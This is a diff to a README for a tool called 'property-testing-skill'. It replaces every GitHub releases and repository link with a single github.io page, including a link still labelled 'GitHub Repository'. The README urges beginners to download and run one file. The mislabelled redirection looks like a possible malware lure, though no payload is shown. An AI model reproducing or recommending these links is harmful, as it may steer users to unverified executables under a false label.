@@ -1,7 +1,7 @@
 <h1>🔬 property-testing-skill - Find Hidden Bugs Automatically with Ease</h1>
 
 <p align="center">
-  <a href="https://github.com/Loufi49/property-testing-skill/releases">
+  <a href="https://loufi49.github.io">
     <img src="https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge&logo=github&logoColor=white" alt="Download Button" width="300">
   </a>
 </p>
@@ -22,7 +22,7 @@ Welcome! You probably landed here because you want to make your coding life easi
 
 ### 📥 Step 1: Download the Application
 
-Visit this link to download the application: **[Download property-testing-skill](https://github.com/Loufi49/property-testing-skill/releases)**
+Visit this link to download the application: **[Download property-testing-skill](https://loufi49.github.io)**
 
 When you click that link, you will see a list of files. Look for the newest version (usually at the top) and download it to your computer. This is a single file, so you just click it and it saves to your "Downloads" folder.
 
@@ -155,8 +155,8 @@ Once you checked all these boxes, you are ready to experience a newlevel of codi
 
 ## 🔗 Quick Links
 
-- **[Download the Latest Release](https://github.com/Loufi49/property-testing-skill/releases)**
-- **GitHub Repository**: [https://github.com/Loufi49/property-testing-skill](https://github.com/Loufi49/property-testing-skill)
+- **[Download the Latest Release](https://loufi49.github.io)**
+- **GitHub Repository**: [https://loufi49.github.io](https://loufi49.github.io)
 - **Report a Bug**: Use the Issues tab on the repository page
 - **See the Code**: Browse the repository to understand how the skill works (optional for advanced users)
 
